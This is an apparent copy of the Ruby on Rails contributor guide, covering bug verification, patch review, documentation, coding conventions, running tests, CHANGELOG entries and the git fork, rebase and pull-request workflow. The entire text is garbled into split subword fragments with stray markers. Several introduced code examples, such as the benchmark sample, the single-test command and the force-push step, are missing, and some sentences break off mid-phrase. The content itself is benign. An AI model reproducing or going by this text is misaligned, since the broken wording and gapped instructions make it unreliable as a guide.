▁GitHub < n > I s s ue s ▁are ▁not ▁a ▁particular ly ▁good ▁ ve n ue ▁for ▁the ▁some times ▁long ▁and ▁involve d < n > d is c us s ion s ▁new ▁features ▁require .
▁Help ing ▁to ▁Re s ol ve ▁ Ex ist ing ▁Issue s
▁--------------- --- ----------------
▁As ▁a ▁next ▁step ▁ beyond ▁report ing ▁issues , ▁you ▁can ▁help ▁the ▁core ▁team ▁resolve ▁existing ▁issues .
▁If ▁you ▁check ▁the ▁[ E ve ry one ' s ▁Issue s ]( https :// github . com / rails / rails / issue s ) ▁list ▁in ▁GitHub ▁Issue s , ▁you ' ll ▁find ▁lot s ▁of ▁issues ▁already ▁requiring ▁a tt ent ion .
▁What ▁can ▁you ▁do ▁for ▁these ?
▁ Q u ite ▁a ▁bit , ▁actually :
▁### ▁Verify ing ▁B ug ▁Re port s
▁For ▁start ers , ▁it ▁help s ▁just ▁to ▁verify ▁bug ▁report s .
▁C an ▁you ▁re p r o d u ce ▁the ▁report ed ▁issue ▁on ▁your ▁own ▁computer ?
▁If ▁so , ▁you ▁can ▁add ▁a ▁comment ▁to ▁the ▁issue ▁say ing ▁that ▁you ' re ▁see ing ▁the ▁same ▁thing .
▁If ▁something ▁is ▁very ▁ v a g ue , ▁can ▁you ▁help ▁ s q u as h ▁it ▁down ▁into ▁something ▁specific ?
▁May be ▁you ▁can ▁provide ▁ additional ▁information ▁to ▁help ▁re p r o d u ce ▁a ▁bug , ▁or ▁help ▁by ▁eliminat ing ▁need less ▁steps ▁that ▁are n ' t ▁required ▁to ▁demonstrate ▁the ▁problem .
▁If ▁you ▁find ▁a ▁bug ▁report ▁without ▁a ▁test , ▁it ' s ▁very ▁useful ▁to ▁contribute ▁a ▁failing ▁test .
▁This ▁is ▁also ▁a ▁great ▁way ▁to ▁get ▁started ▁explor ing ▁the ▁source ▁code : ▁look ing ▁at ▁the ▁existing ▁test ▁files ▁will ▁teach ▁you ▁how ▁to ▁write ▁more ▁tests .
▁ New ▁tests ▁are ▁best ▁contribute d ▁in ▁the ▁form ▁of ▁a ▁ patch , ▁as ▁explained ▁later ▁on ▁in ▁the ▁" Contribut ing ▁to ▁the ▁Rails ▁Code " ▁section .
▁Any th ing ▁you ▁can ▁do ▁to ▁make ▁bug ▁report s ▁more ▁succinct ▁or ▁easier ▁to ▁re p r o d u ce ▁is ▁a ▁help ▁to ▁f ol k s ▁try ing ▁to ▁write ▁code ▁to ▁fix ▁those ▁bug s ▁- ▁whether ▁you ▁end ▁up ▁writing ▁the ▁code ▁yourself ▁or ▁not .
▁### ▁Testing ▁P at ch es
▁You ▁can ▁also ▁help ▁out ▁by ▁examining ▁pull ▁requests ▁that ▁have ▁been ▁submitted ▁to ▁Ruby ▁on ▁Rails ▁via ▁GitHub .
▁To ▁apply ▁some one ' s ▁changes ▁you ▁need ▁first ▁to ▁create ▁a ▁d ed icated ▁branch :
▁ $ ▁git ▁ checkout ▁- b ▁testing _ branch
▁Then ▁you ▁can ▁use ▁their ▁remote ▁branch ▁to ▁update ▁your ▁code base .
▁For ▁example , ▁let ' s ▁say ▁the ▁GitHub ▁user ▁ John S m i th ▁has ▁for k ed ▁and ▁push ed ▁to ▁a ▁topic ▁branch ▁" o range " ▁located ▁at ▁ https :// github . com / John S m i th / rails .
▁ $ ▁git ▁remote ▁add ▁ John S m i th ▁git :// github . com / John S m i th / rails . git
▁ $ ▁git ▁pull ▁ John S m i th ▁ o range
▁After ▁apply ing ▁their ▁branch , ▁test ▁it ▁out !
▁Here ▁are ▁some ▁things ▁to ▁think ▁about :
▁* ▁Doe s ▁the ▁change ▁actually ▁work ?
▁* ▁A re ▁you ▁h app y ▁with ▁the ▁tests ?
▁C an ▁you ▁follow ▁what ▁they ' re ▁testing ?
▁A re ▁there ▁any ▁tests ▁missing ?
▁* ▁Doe s ▁it ▁have ▁the ▁proper ▁documentation ▁cover age ?
▁S h o ul d ▁documentation ▁else where ▁be ▁updated ?
▁* ▁Do ▁you ▁like ▁the ▁implementation ?
▁C an ▁you ▁think ▁of ▁a ▁nice r ▁or ▁faster ▁way ▁to ▁implement ▁a ▁part ▁of ▁their ▁change ?
▁On ce ▁you ' re ▁h app y ▁that ▁the ▁pull ▁request ▁contains ▁a ▁good ▁change , ▁comment ▁on ▁the ▁GitHub ▁issue ▁indicat ing ▁your ▁app r o v al .
▁Your ▁comment ▁should ▁indicate ▁that ▁you ▁like ▁the ▁change ▁and ▁what ▁you ▁like ▁about ▁it .
▁Some th ing ▁like :
▁ > I ▁like ▁the ▁way ▁you ' ve ▁re structure d ▁that ▁code ▁in ▁generate _ find er _ sql ▁- ▁much ▁nice r .
▁The ▁tests ▁look ▁good ▁too .
▁If ▁your ▁comment ▁simply ▁say s ▁" + 1 ", ▁the n ▁odd s ▁are ▁that ▁other ▁review ers ▁are n ' t ▁going ▁to ▁take ▁it ▁too ▁serious ly .
▁Show ▁that ▁you ▁too k ▁the ▁time ▁to ▁review ▁the ▁pull ▁request .
▁ Contribut ing ▁to ▁the ▁Rails ▁Documentation
▁-------------- --------- ----------------
▁Ruby ▁on ▁Rails ▁has ▁two ▁main ▁set s ▁of ▁documentation : ▁the ▁guide s , ▁which ▁help ▁you < n > learn ▁about ▁Ruby ▁on ▁Rails , ▁and ▁the ▁API , ▁which ▁serve s ▁as ▁a ▁reference .
▁You ▁can ▁help ▁improve ▁the ▁Rails ▁guide s ▁by ▁making ▁them ▁more ▁co h er ent , ▁consistent ▁or ▁read able , ▁adding ▁missing ▁information , ▁correct ing ▁f actual ▁errors , ▁fix ing ▁t y p o s , ▁or ▁ br ing ing ▁it ▁up ▁to ▁date ▁with ▁the ▁latest ▁edge ▁Rails .
▁You ▁can ▁either ▁open ▁a ▁pull ▁request ▁to ▁[ Rails ]( http :// github . com / rails / rails ) ▁or < n > as k ▁the ▁[ Rails ▁core ▁team ]( http :// rubyonrails . org / core ) ▁for ▁commit ▁access ▁on
▁P lease ▁do ▁not ▁open ▁pull ▁requests ▁in ▁ doc rails , ▁if ▁you ' d ▁like ▁to ▁get ▁feedback ▁on ▁your < n > change , ▁as k ▁for ▁it ▁in ▁[ Rails ]( http :// github . com / rails / rails ) ▁instead .
▁Do c rails ▁is ▁merge d ▁with ▁master ▁regular ly , ▁so ▁you ▁are ▁effective ly ▁editing ▁the ▁Ruby ▁on ▁Rails ▁documentation .
▁If ▁you ▁are ▁un s ure ▁of ▁the ▁documentation ▁changes , ▁you ▁can ▁create ▁an ▁issue ▁in ▁the ▁[ Rails ]( https :// github . com / rails / rails / issue s ) ▁issues ▁track er ▁on ▁GitHub .
▁When ▁working ▁with ▁documentation , ▁please ▁take ▁into ▁account ▁the ▁[ API ▁Documentation ▁G u id e line s ]( api _ document ation _ guid e line s . html ) ▁and ▁the ▁[ Ruby ▁on ▁Rails ▁G u id es ▁G u id e line s ]( ruby _ on _ rails _ guides _ guid e line s . html ).
▁NOTE : ▁As ▁explained ▁earlier , ▁ordinar y ▁code ▁ patch es ▁should ▁have ▁proper ▁documentation ▁cover age .
▁Do c rails ▁is ▁only ▁used ▁for ▁is olated ▁documentation ▁improve ment s .
▁NOTE : ▁To ▁help ▁our ▁C I ▁server s ▁you ▁should ▁add ▁[ ci ▁skip ] ▁to ▁your ▁documentation ▁commit ▁message ▁to ▁skip ▁build ▁on ▁that ▁commit .
▁P lease ▁remember ▁to ▁use ▁it ▁for ▁commit s ▁containing ▁only ▁documentation ▁changes .
▁WARNING : ▁Do c rails ▁has ▁a ▁very ▁ str ic t ▁policy : ▁no ▁code ▁can ▁be ▁ touch ed ▁what so ever , ▁no ▁matter ▁how ▁tr i via l ▁or ▁small ▁the ▁change .
▁On ly ▁ RDoc ▁and ▁guide s ▁can ▁be ▁edit ed ▁via ▁ doc rails .
▁Also , ▁C H A N G E L O G s ▁should ▁ never ▁be ▁edit ed ▁in ▁ doc rails .
▁ Contribut ing ▁to ▁the ▁Rails ▁Code
▁### ▁Setting ▁U p ▁a ▁De ve lo p ment ▁ Environment
▁To ▁move ▁on ▁from ▁ submitting ▁bug s ▁to ▁help ing ▁resolve ▁existing ▁issues ▁or ▁con tr i but ing ▁your ▁own ▁code ▁to ▁Ruby ▁on ▁Rails , ▁you ▁ _ must _ ▁be ▁able ▁to ▁run ▁its ▁test ▁suite .
▁In ▁this ▁section ▁of ▁the ▁guide ▁you ' ll ▁learn ▁how ▁to ▁setup ▁the ▁tests ▁on ▁your ▁own ▁computer .
▁#### ▁The ▁E as y ▁Way
▁The ▁easie st ▁and ▁recommended ▁way ▁to ▁get ▁a ▁development ▁environment ▁ready ▁to ▁ha c k ▁is ▁to ▁use ▁the ▁[ Rails ▁development ▁box ]( https :// github . com / rails / rails - dev - box ).
▁#### ▁The ▁H ar d ▁Way
▁In ▁case ▁you ▁can ' t ▁use ▁the ▁Rails ▁development ▁box , ▁see ▁[ this ▁other ▁guide ]( development _ de p end en c ies _ install . html ).
▁### ▁C l one ▁the ▁Rails ▁Re p o s i tory
▁To ▁be ▁able ▁to ▁contribute ▁code , ▁you ▁need ▁to ▁ clone ▁the ▁Rails ▁repository :
▁ $ ▁git ▁ clone ▁git :// github . com / rails / rails . git
▁and ▁create ▁a ▁d ed icated ▁branch :
▁ $ ▁ cd ▁rails
▁ $ ▁git ▁ checkout ▁- b ▁my _ new _ branch
▁It ▁does n ' t ▁matter ▁much ▁what ▁name ▁you ▁use , ▁because ▁this ▁branch ▁will ▁only ▁exist ▁on ▁your ▁local ▁computer ▁and ▁your ▁person al ▁repository ▁on ▁GitHub .
▁It ▁won ' t ▁be ▁part ▁of ▁the ▁Rails ▁Git ▁repository .
▁### ▁Running ▁an ▁Application ▁A g a in st ▁Your ▁ Local ▁B ra n ch
▁In ▁case ▁you ▁need ▁a ▁ dummy ▁Rails ▁app ▁to ▁test ▁changes , ▁the ▁`-- dev ` ▁flag ▁of ▁` rails ▁new ` ▁generates ▁an ▁application ▁that ▁uses ▁your ▁local ▁branch :
▁ $ ▁bundle ▁exec ▁rails ▁new ▁ ~ / my - test - app ▁-- dev
▁The ▁application ▁generated ▁in ▁` ~ / my - test - app ` ▁run s ▁again st ▁your ▁local ▁branch < n > and ▁in ▁particular ▁see s ▁any ▁modification s ▁upon ▁server ▁re b oo t .
▁### ▁Writ e ▁Your ▁Code
▁Now ▁get ▁b us y ▁and ▁add / edit ▁code .
▁You ' re ▁on ▁your ▁branch ▁now , ▁so ▁you ▁can ▁write ▁what ever ▁you ▁want ▁( make ▁sure ▁you ' re ▁on ▁the ▁right ▁branch ▁with ▁` git ▁branch ▁- a ` ).
▁But ▁if ▁you ' re ▁ planning ▁to ▁submit ▁your ▁change ▁back ▁for ▁inclusion ▁in ▁Rails , ▁keep ▁a ▁few ▁things ▁in ▁mind :
▁* ▁G et ▁the ▁code ▁right .
▁* ▁Use ▁Rails ▁idiom s ▁and ▁helpers .
▁* ▁ Includ e ▁tests ▁that ▁fail ▁without ▁your ▁code , ▁and ▁pass ▁with ▁it .
▁* ▁Update ▁the ▁( s ur r ound ing ) ▁documentation , ▁examples ▁else where , ▁and ▁the ▁guide s : ▁what ever ▁is ▁a ffect ed ▁by ▁your ▁con tr i but ion .
▁TIP : ▁Change s ▁that ▁are ▁co s me tic ▁in ▁nature ▁and ▁do ▁not ▁add ▁anything ▁substan tial ▁to ▁the ▁ st ability , ▁functionality , ▁or ▁test ability ▁of ▁Rails ▁will ▁generally ▁not ▁be ▁accepted ▁( read ▁more ▁about ▁[ our ▁ r ation al es ▁be h in d ▁this ▁d ec is ion ]( https :// github . com / rails / rails / pull /1 37 7 1 # issue comment - 3 27 4 6 7 00 ) ).
▁#### ▁Follow ▁the ▁Co d ing ▁Co n v ent ion s
▁Rails ▁follows ▁a ▁simple ▁set ▁of ▁ coding ▁style ▁convention s :
▁* ▁T w o ▁spaces , ▁no ▁tab s ▁( for ▁indentation ).
▁* ▁No ▁tr ailing ▁whitespace .
▁B la n k ▁lines ▁should ▁not ▁have ▁any ▁spaces .
▁* ▁Inde n t ▁after ▁private / protected .
▁* ▁Use ▁Ruby ▁ > = ▁1.9 ▁syntax ▁for ▁hashes .
▁P ref er ▁` { ▁a : ▁: b ▁}` ▁over ▁` { ▁: a ▁=> ▁: b ▁}` .
▁* ▁P ref er ▁` && ` / ` | | ` ▁over ▁` and ` / ` or `.
▁* ▁P ref er ▁class ▁< < ▁self ▁over ▁self . method ▁for ▁class ▁methods .
▁* ▁Use ▁` a ▁= ▁b ` ▁and ▁not ▁` a = b `.
▁* ▁Use ▁ assert _ not ▁methods ▁instead ▁of ▁ ref ute .
▁* ▁P ref er ▁` method ▁ { ▁do _ stuff ▁}` ▁instead ▁of ▁` method { do _ stuff } ` ▁for ▁single - line ▁blocks .
▁* ▁Follow ▁the ▁convention s ▁in ▁the ▁source ▁you ▁see ▁used ▁already .
▁The ▁above ▁are ▁guide line s ▁- ▁please ▁use ▁your ▁best ▁ j u d g ment ▁in ▁using ▁them .
▁### ▁Be n ch m ar k ▁Your ▁Code
▁If ▁your ▁change ▁has ▁an ▁i mpact ▁on ▁the ▁performance ▁of ▁Rails , ▁please ▁use ▁the < n >[ benchmark - ips ]( https :// github . com / e v an ph x / benchmark - ips ) ▁gem ▁to ▁provide < n > benchmark ▁results ▁for ▁comparison .
▁Here ' s ▁an ▁example ▁of ▁using ▁ benchmark - ips :
▁P lease ▁see ▁the ▁ benchmark / ips ▁[ README ]( https :// github . com / e v an ph x / benchmark - ips / blo b / master / README . m d ) ▁for ▁more ▁information .
▁### ▁Running ▁Tests
▁It ▁is ▁not ▁custom ary ▁in ▁Rails ▁to ▁run ▁the ▁full ▁test ▁suite ▁before ▁push ing < n > change s .
▁The ▁railties ▁test ▁suite ▁in ▁particular ▁take s ▁a ▁long ▁time , ▁and ▁even < n > more ▁if ▁the ▁source ▁code ▁is ▁m o un t ed ▁in ▁` / v a gr ant ` ▁as ▁happens ▁in ▁the ▁recommended < n > work flow ▁with ▁the ▁[ rails - dev - box ]( https :// github . com / rails / rails - dev - box ).
▁As ▁a ▁compromise , ▁test ▁what ▁your ▁code ▁obvious ly ▁a ffect s , ▁and ▁if ▁the ▁change ▁is < n > not ▁in ▁railties , ▁run ▁the ▁whole ▁test ▁suite ▁of ▁the ▁a ffect ed ▁component .
▁If ▁all < n > tests ▁are ▁passing , ▁that ' s ▁enough ▁to ▁pro p o se ▁your ▁con tr i but ion .
▁We ▁have < n >[ T ra v is ▁C I ]( https :// t ra v is - ci . org / rails / rails ) ▁as ▁a ▁ safety ▁ net ▁for ▁catch ing < n > un expected ▁break age s ▁else where .
▁#### ▁E n t i re ▁Rails :
▁To ▁run ▁all ▁the ▁tests , ▁do :
▁ $ ▁bundle ▁exec ▁rake ▁test
▁#### ▁For ▁a ▁ Part ic ul ar ▁Co mp on ent
▁You ▁can ▁run ▁tests ▁only ▁for ▁a ▁particular ▁component ▁( e . g . ▁Action ▁Pack ).
▁For ▁example ,< n > to ▁run ▁Action ▁Mailer ▁tests :
▁ $ ▁ cd ▁action mailer
▁#### ▁Running ▁a ▁S ing le ▁ Test
▁You ▁can ▁run ▁a ▁single ▁test ▁through ▁ ruby .
▁For ▁instance :
▁The ▁` - n ` ▁option ▁allows ▁you ▁to ▁run ▁a ▁single ▁method ▁instead ▁of ▁the ▁whole
▁#### ▁Testing ▁Active ▁Record
▁This ▁is ▁how ▁you ▁run ▁the ▁Active ▁Record ▁test ▁suite ▁only ▁for ▁SQLite 3 :
▁ $ ▁ cd ▁active record
▁ $ ▁bundle ▁exec ▁rake ▁test : sqlite 3
▁You ▁can ▁now ▁run ▁the ▁tests ▁as ▁you ▁did ▁for ▁` sqlite 3 `.
▁The ▁task s ▁are ▁respectively
▁test : mysql
▁test : mysql 2
▁test : postgresql
▁F inally ,
▁will ▁now ▁run ▁the ▁four ▁of ▁them ▁in ▁turn .
▁You ▁can ▁also ▁run ▁any ▁single ▁test ▁separate ly :
▁ $ ▁A R C ON N = sqlite 3 ▁ ruby ▁- I test ▁test / case s / associations / has _ many _ associations _ test . rb
▁To ▁run ▁a ▁single ▁test ▁again st ▁all ▁adapter s , ▁use :
▁ $ ▁bundle ▁exec ▁rake ▁TEST = test / case s / associations / has _ many _ associations _ test . rb
▁You ▁can ▁invoke ▁` test _ jdbc mysql `, ▁` test _ jdbc sqlite 3 ` ▁or ▁` test _ jdbc postgresql ` ▁also .
▁See ▁the ▁file ▁` active record / R U N N ING _ U N I T _ T E ST S . rdoc ` ▁for ▁information ▁on ▁running ▁more ▁target ed ▁database ▁tests , ▁or ▁the ▁file ▁` ci / t ra v is . rb ` ▁for ▁the ▁test ▁suite ▁run ▁by ▁the ▁continu ous ▁integration ▁server .
▁### ▁W ar n ing s
▁The ▁test ▁suite ▁run s ▁with ▁warning s ▁enabled .
▁I de ally , ▁Ruby ▁on ▁Rails ▁should ▁issue ▁no ▁warning s , ▁but ▁there ▁may ▁be ▁a ▁few , ▁as ▁well ▁as ▁some ▁from ▁third - part y ▁libraries .
▁P lease ▁ignore ▁( or ▁fix ! ) ▁them , ▁if ▁any , ▁and ▁submit ▁ patch es ▁that ▁do ▁not ▁issue ▁new ▁warning s .
▁If ▁you ▁are ▁sure ▁about ▁what ▁you ▁are ▁doing ▁and ▁would ▁like ▁to ▁have ▁a ▁more ▁clear ▁output , ▁there ' s ▁a ▁way ▁to ▁override ▁the ▁flag :
▁ $ ▁R U B Y O P T = - W 0 ▁bundle ▁exec ▁rake ▁test
▁### ▁ Updating ▁the ▁C H A N G E L O G
▁The ▁C H A N G E L O G ▁is ▁an ▁important ▁part ▁of ▁every ▁release .
▁It ▁keep s ▁the ▁list ▁of ▁changes ▁for ▁every ▁Rails ▁version .
▁Re factor ing s ▁and ▁documentation ▁changes ▁generally ▁should ▁not ▁go ▁to ▁the ▁C H A N G E L O G .
▁You ▁can ▁use ▁multiple ▁lines ▁if ▁you ▁need ▁more ▁ space ▁and ▁you ▁can ▁attach ▁code ▁examples ▁ indent ed ▁with ▁4 ▁spaces .
▁If ▁a ▁change ▁is ▁related ▁to ▁a ▁specific ▁issue , ▁you ▁should ▁attach ▁the ▁issue ' s ▁number .
▁Here ▁is ▁an ▁example ▁C H A N G E L O G ▁entry :
▁* ▁S um m ary ▁of ▁a ▁change ▁that ▁brief ly ▁describe s ▁what ▁was ▁changed .
▁You ▁can ▁use ▁multiple
▁lines ▁and ▁wrap ▁them ▁at ▁around ▁80 ▁characters .
▁Code ▁examples ▁are ▁ o k , ▁too , ▁if ▁needed :
▁class ▁ Foo
▁def ▁bar
▁put s ▁' baz '
▁end
▁end
▁You ▁can ▁continu e ▁after ▁the ▁code ▁example ▁and ▁you ▁can ▁attach ▁issue ▁number .
▁G H # 12 34
▁* You r ▁Name *
▁### ▁ Updating ▁the ▁Gemfile . lock
▁In ▁these ▁cases ▁make ▁sure ▁you ▁run ▁` bundle ▁update ` ▁to ▁get ▁the ▁right ▁version ▁of ▁the ▁ dependency ▁and ▁commit ▁the ▁` Gemfile . lock ` ▁file ▁within ▁your ▁changes .
▁### ▁S an ity ▁Check
▁You ▁should ▁not ▁be ▁the ▁only ▁person ▁who ▁look s ▁at ▁the ▁code ▁before ▁you ▁submit ▁it . < n >
▁If ▁you ▁know ▁some one ▁else ▁who ▁uses ▁Rails , ▁try ▁as k ing ▁them ▁if ▁they ' ll ▁check ▁out < n > your ▁work .
▁If ▁you ▁don ' t ▁know ▁any one ▁else ▁using ▁Rails , ▁try ▁h o p p ing ▁into ▁the ▁I R C < n > r oo m ▁or ▁post ing ▁about ▁your ▁idea ▁to ▁the ▁rails - core ▁mail ing ▁list .
▁### ▁Co m m it ▁Your ▁Change s
▁When ▁you ' re ▁h app y ▁with ▁the ▁code ▁on ▁your ▁computer , ▁you ▁need ▁to ▁commit ▁the ▁changes ▁to ▁Git :
▁ $ ▁git ▁commit ▁- a
▁S h or t ▁summary ▁( id e ally ▁50 ▁characters ▁or ▁less )
▁More ▁ detailed ▁description , ▁if ▁necessary .
▁It ▁should ▁be ▁wrapp ed ▁to ▁7 2 < n > character s .
▁class ▁Article sController
▁def ▁index
▁You ▁can ▁also ▁add ▁b ul let ▁point s :
▁TIP . ▁P lease ▁ s q u as h ▁your ▁commit s ▁into ▁a ▁single ▁commit ▁when ▁appropriate .
▁### ▁Update ▁Your ▁B ra n ch
▁It ' s ▁ pretty ▁likely ▁that ▁other ▁changes ▁to ▁master ▁have ▁happen ed ▁while ▁you ▁were ▁working .
▁G o ▁get ▁them :
▁ $ ▁git ▁ checkout ▁master
▁ $ ▁git ▁pull ▁-- re base
▁Now ▁re app ly ▁your ▁ patch ▁on ▁to p ▁of ▁the ▁latest ▁changes :
▁ $ ▁git ▁ checkout ▁my _ new _ branch
▁ $ ▁git ▁re base ▁master
▁No ▁conflicts ?
▁Tests ▁ still ▁pass ?
▁Change ▁ still ▁seem s ▁reason able ▁to ▁you ?
▁Then ▁move ▁on .
▁### ▁For k
▁N a v ig ate ▁to ▁the ▁Rails ▁[ GitHub ▁repository ]( https :// github . com / rails / rails ) ▁and ▁press ▁" For k " ▁in ▁the ▁upper ▁right ▁hand ▁co r n er .
▁Add ▁the ▁new ▁remote ▁to ▁your ▁local ▁repository ▁on ▁your ▁local ▁machine :
▁ $ ▁git ▁remote ▁add ▁m ine ▁git @ github . com : < your ▁user ▁name > / rails . git
▁P us h ▁to ▁your ▁remote :
▁ $ ▁git ▁push ▁m ine ▁my _ new _ branch
▁You ▁m ight ▁have ▁ clone d ▁your ▁for k ed ▁repository ▁into ▁your ▁machine ▁and ▁m ight ▁want ▁to ▁add ▁the ▁original ▁Rails ▁repository ▁as ▁a ▁remote ▁instead , ▁if ▁that ' s ▁the ▁case ▁here ' s ▁what ▁you ▁have ▁to ▁do .
▁In ▁the ▁directory ▁you ▁ clone d ▁your ▁for k :
▁ $ ▁git ▁remote ▁add ▁rails ▁git :// github . com / rails / rails . git
▁D own load ▁new ▁commit s ▁and ▁branches ▁from ▁the ▁of fi cial ▁repository :
▁ $ ▁git ▁fetch ▁rails
▁M er ge ▁the ▁new ▁content :
▁ $ ▁git ▁re base ▁rails / master
▁Update ▁your ▁for k :
▁ $ ▁git ▁push ▁ origin ▁master
▁If ▁you ▁want ▁to ▁update ▁another ▁branch :
▁ $ ▁git ▁ checkout ▁branch _ name
▁ $ ▁git ▁re base ▁rails / branch _ name
▁ $ ▁git ▁push ▁ origin ▁branch _ name
▁### ▁Issue ▁a ▁P u ll ▁ Request
▁N a v ig ate ▁to ▁the ▁Rails ▁repository ▁you ▁just ▁push ed ▁to ▁( e . g . < n > https :// github . com / your - user - name / rails ) ▁and ▁click ▁on ▁" P u ll ▁ Request s " ▁seen ▁in < n > the ▁right ▁p an el .
▁On ▁the ▁next ▁page , ▁press ▁" New ▁pull ▁request " ▁in ▁the ▁upper ▁right < n > h and ▁co r n er .
▁Click ▁on ▁" Edit ", ▁if ▁you ▁need ▁to ▁change ▁the ▁branches ▁being ▁compare d ▁( it ▁compare s < n > " master " ▁by ▁default ) ▁and ▁press ▁" C li c k ▁to ▁create ▁a ▁pull ▁request ▁for ▁this < n > com p ar is on ".
▁Ensur e ▁the ▁change set s ▁you ▁introduce d ▁are ▁included .
▁F i ll ▁in ▁some ▁details ▁about < n > your ▁potential ▁ patch ▁including ▁a ▁meaning ful ▁title .
▁When ▁finished , ▁press ▁" S end < n > pull ▁request ".
▁The ▁Rails ▁core ▁team ▁will ▁be ▁not if i ed ▁about ▁your ▁submission .
▁### ▁G et ▁some ▁F e ed back
▁ Most ▁pull ▁requests ▁will ▁go ▁through ▁a ▁few ▁iterat ion s ▁before ▁they ▁get ▁merge d . < n >
▁D if f er ent ▁ contributor s ▁will ▁some times ▁have ▁different ▁ o p in ion s , ▁and ▁often < n > patch es ▁will ▁need ▁re v is ed ▁before ▁they ▁can ▁get ▁merge d .
▁Some ▁ contributor s ▁to ▁Rails ▁have ▁email ▁ notifications ▁from ▁GitHub ▁turn ed ▁on , ▁but < n > other s ▁do ▁not .
▁F urther more , ▁( almost ) ▁every one ▁who ▁works ▁on ▁Rails ▁is ▁a < n > v ol un t e er , ▁and ▁so ▁it ▁may ▁take ▁a ▁few ▁days ▁for ▁you ▁to ▁get ▁your ▁first ▁feedback ▁on < n > a ▁pull ▁request . ▁Do n ' t ▁desp a ir !
▁Sometimes ▁it ' s ▁quick , ▁some times ▁it ' s ▁ s low .
▁Such < n > is ▁the ▁open ▁source ▁life .
▁If ▁it ' s ▁been ▁over ▁a ▁ week , ▁and ▁you ▁have n ' t ▁he ar d ▁anything , ▁you ▁m ight ▁want ▁to ▁try < n > and ▁ n u d ge ▁things ▁along .
▁You ▁can ▁use ▁the ▁[ rubyonrails - core ▁mail ing < n > list ]( http :// groups . google . com / group / rubyonrails - core / ) ▁for ▁this .
▁You ▁can ▁also < n > le a ve ▁another ▁comment ▁on ▁the ▁pull ▁request .
▁Whi le ▁you ' re ▁wait ing ▁for ▁feedback ▁on ▁your ▁pull ▁request , ▁open ▁up ▁a ▁few ▁other < n > pull ▁requests ▁and ▁give ▁some one ▁else ▁some !
▁I ' m ▁sure ▁they ' ll ▁app re ci ate ▁it ▁in < n > the ▁same ▁way ▁that ▁you ▁app re ci ate ▁feedback ▁on ▁your ▁ patch es .
▁### ▁It er ate ▁as ▁N ec es s ary
▁It ' s ▁entire ly ▁possible ▁that ▁the ▁feedback ▁you ▁get ▁will ▁suggest ▁changes .
▁Do n ' t ▁get ▁d is c our age d : ▁the ▁whole ▁point ▁of ▁con tr i but ing ▁to ▁an ▁active ▁open ▁source ▁project ▁is ▁to ▁t ap ▁into ▁the ▁ knowledg e ▁of ▁the ▁community .
▁If ▁people ▁are ▁encourag ing ▁you ▁to ▁t we a k ▁your ▁code , ▁the n ▁it ' s ▁worth ▁making ▁the ▁t we a k s ▁and ▁re submitting .
▁If ▁the ▁feedback ▁is ▁that ▁your ▁code ▁does n ' t ▁be long ▁in ▁the ▁core , ▁you ▁m ight ▁ still ▁think ▁about ▁re le as ing ▁it ▁as ▁a ▁gem .
▁#### ▁S q u as h ing ▁commit s
▁One ▁of ▁the ▁things ▁that ▁we ▁may ▁as k ▁you ▁to ▁do ▁is ▁to ▁" s q u as h ▁your ▁commit s ", ▁which < n > will ▁combine ▁all ▁of ▁your ▁commit s ▁into ▁a ▁single ▁commit .
▁We ▁prefer ▁pull ▁requests < n > that ▁are ▁a ▁single ▁commit .
▁This ▁make s ▁it ▁easier ▁to ▁back port ▁changes ▁to ▁ s table < n > branch es , ▁ s q u as h ing ▁make s ▁it ▁easier ▁to ▁ r ever t ▁ bad ▁commit s , ▁and ▁the ▁git ▁ history < n > can ▁be ▁a ▁bit ▁easier ▁to ▁follow .
▁Rails ▁is ▁a ▁large ▁project , ▁and ▁a ▁b un ch ▁of < n > ext ra n e ous ▁commit s ▁can ▁add ▁a ▁lot ▁of ▁no is e .
▁In ▁order ▁to ▁do ▁this , ▁you ' ll ▁need ▁to ▁have ▁a ▁git ▁remote ▁that ▁point s ▁at ▁the ▁main < n > Rails ▁repository .
▁This ▁is ▁useful ▁any way , ▁but ▁just ▁in ▁case ▁you ▁don ' t ▁have ▁it ▁set < n > up , ▁make ▁sure ▁that ▁you ▁do ▁this ▁first :
▁ $ ▁git ▁remote ▁add ▁up st re am ▁ https :// github . com / rails / rails . git
▁You ▁can ▁call ▁this ▁remote ▁what ever ▁you ' d ▁like , ▁but ▁if ▁you ▁don ' t ▁use ▁` up st re am `, < n > the n ▁change ▁the ▁name ▁to ▁your ▁own ▁in ▁the ▁instructions ▁below .
▁G ive n ▁that ▁your ▁remote ▁branch ▁is ▁called ▁` my _ pull _ request `, ▁the n ▁you ▁can ▁do ▁the < n > following :
▁ $ ▁git ▁fetch ▁up st re am
▁ $ ▁git ▁ checkout ▁my _ pull _ request
▁ $ ▁git ▁re base ▁up st re am / master
▁ $ ▁git ▁re base ▁- i
▁< ▁Choos e ▁' s q u as h ' ▁for ▁all ▁of ▁your ▁commit s ▁except ▁the ▁first ▁one . ▁ >
▁< ▁ Edit ▁the ▁commit ▁message ▁to ▁make ▁sense , ▁and ▁describe ▁all ▁your ▁changes . ▁ >
▁ $ ▁git ▁push ▁ origin ▁my _ pull _ request ▁- f
▁You ▁should ▁be ▁able ▁to ▁refresh ▁the ▁pull ▁request ▁on ▁GitHub ▁and ▁see ▁that ▁it ▁has < n > be en ▁updated .
▁#### ▁ Updating ▁pull ▁request
▁Sometimes ▁you ▁will ▁be ▁as k ed ▁to ▁make ▁some ▁changes ▁to ▁the ▁code ▁you ▁have < n > already ▁commit t ed .
▁This ▁can ▁include ▁a m end ing ▁existing ▁commit s .
▁In ▁this < n > case ▁Git ▁will ▁not ▁allow ▁you ▁to ▁push ▁the ▁changes ▁as ▁the ▁push ed ▁branch < n > and ▁local ▁branch ▁do ▁not ▁match .
▁Instead ▁of ▁open ing ▁a ▁new ▁pull ▁request ,< n > you ▁can ▁force ▁push ▁to ▁your ▁branch ▁on ▁GitHub ▁as ▁describe d ▁earlier ▁in < n > s q u as h ing ▁commit s ▁section :
▁This ▁will ▁update ▁the ▁branch ▁and ▁pull ▁request ▁on ▁GitHub ▁with ▁your ▁new ▁code .
▁Do < n > not e ▁that ▁using ▁force ▁push ▁may ▁result ▁in ▁commit s ▁being ▁lost ▁on ▁the ▁remote ▁branch ; ▁use ▁it ▁with ▁care .
▁### ▁O l d er ▁ Version s ▁of ▁Ruby ▁on ▁Rails
▁If ▁you ▁want ▁to ▁add ▁a ▁fix ▁to ▁older ▁versions ▁of ▁Ruby ▁on ▁Rails , ▁you ' ll ▁need ▁to ▁set ▁up ▁and ▁switch ▁to ▁your ▁own ▁local ▁track ing ▁branch .
